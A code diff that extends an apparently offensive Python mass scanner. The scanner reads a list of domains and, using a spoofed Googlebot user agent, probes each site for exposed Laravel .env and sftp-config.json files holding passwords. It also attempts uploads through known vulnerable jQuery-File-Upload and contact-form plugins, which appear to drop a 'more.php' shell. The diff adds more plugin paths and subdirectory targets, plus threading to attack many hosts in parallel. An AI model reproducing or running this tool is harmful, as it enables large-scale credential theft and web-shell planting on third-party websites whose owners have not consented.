@@ -4,11 +4,15 @@
 
 from datetime import datetime
 from time import sleep, strftime
-import requests, sys, urllib, urllib3, os, base64, re, json
+import requests, sys, urllib, urllib3, threading
+import os, base64, re, json, subprocess
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 file = open('domain.txt', 'r').read().split('\n')
 user_agent = {'User-agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}
+x = subprocess.getoutput('ulimit -n')
+if int(x) <= 1024: y = subprocess.getoutput('ulimit -n 16384')
+else: pass
 
 class cl:
 	green = '\033[92m'
@@ -60,6 +64,14 @@ def jqupload(line):
 	jquery(line, 'js/plugins/jQuery-File-Upload/server/php/', 'js/plugins/jQuery-File-Upload/server/php/files/more.php')
 	jquery(line, 'js/jQuery-File-Upload/server/php/', 'js/jQuery-File-Upload/server/php/files/more.php')
 	jquery(line, 'server/php/', 'server/php/files/more.php')
+	jquery(line, 'components/com_sexycontactform/fileupload/index.php', 'components/com_sexycontactform/fileupload/files/more.php')
+	jquery(line, 'joomla/components/com_sexycontactform/fileupload/index.php', 'joomla/components/com_sexycontactform/fileupload/files/more.php')
+	jquery(line, 'components/com_creativecontactform/fileupload/index.php', 'components/com_creativecontactform/fileupload/files/more.php')
+	jquery(line, 'joomla/components/com_creativecontactform/fileupload/index.php', 'joomla/components/com_creativecontactform/fileupload/files/more.php')
+	jquery(line, 'wp-content/plugins/sexy-contact-form/includes/fileupload/index.php', 'wp-content/plugins/sexy-contact-form/includes/fileupload/files/more.php')
+	jquery(line, 'wp/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php', 'wp/wp-content/plugins/sexy-contact-form/includes/fileupload/files/more.php')
+	jquery(line, 'wordpress/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php', 'wordpress/wp-content/plugins/sexy-contact-form/includes/fileupload/files/more.php')
+	jquery(line, 'blog/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php', 'blog/wp-content/plugins/sexy-contact-form/includes/fileupload/files/more.php')
 
 def laraenv(line):
 	try:
@@ -69,6 +81,19 @@ def laraenv(line):
 		num = int(len(r.text))
 		psw = r.text
 		if rs == 200 and 'PASSWORD' in psw:
+			sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), rs, sizeof(num), url) + cl.end)
+			open('hasil.txt', 'a').write('{}\n'.format(url))
+
+	except: pass
+
+def sftpconf(line):
+	try:
+		url = '{}sftp-config.json'.format(line)
+		r = requests.get(url, headers = user_agent, timeout = 5, verify=False)
+		rs = r.status_code
+		num = int(len(r.text))
+		psw = r.text
+		if rs == 200 and 'password' in psw:
 			sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), rs, sizeof(num), url) + cl.end)
 			open('hasil.txt', 'a').write('{}\n'.format(url))
 
@@ -206,13 +231,24 @@ def gravityform(line):
 def rikues(line):
 	plupload(line)
 	laraenv(line)
+	laraenv(line + 'laravel/')
+	sftpconf(line)
 	wpregister(line)
+	wpregister(line + 'wp/')
+	wpregister(line + 'wordpress/')
+	wpregister(line + 'blog/')
 	jqupload(line)
 	exfinder(line)
 	drupal7(line)
+	drupal7(line + 'drupal/')
 	drupal8(line)
+	drupal8(line + 'drupal/')
 	comfabrik(line)
+	comfabrik(line + 'joomla/')
 	gravityform(line)
+	gravityform(line + 'wp/')
+	gravityform(line + 'wordpress/')
+	gravityform(line + 'blog/')
 
 no = 0
 lcount = sum(1 for line in open('domain.txt'))
@@ -230,7 +266,9 @@ print('=========================================================================
 for line in file:
 	if line == '': break
 	try:
-		rikues(line)
+		t = threading.Thread(target=rikues, args=(line,))
+		t.start()
+		#rikues(line)
 		no = no + 1
 		jumlah = ( no * 100 ) / lcount
 		sys.stdout.flush()
@@ -242,4 +280,6 @@ for line in file:
 		print('===============================================================================')
 		sys.exit()
 
-print('===============================================================================')
+while True:
+	sleep(3); cek = threading.active_count()
+	if cek == 1: print('==============================================================================='); exit()
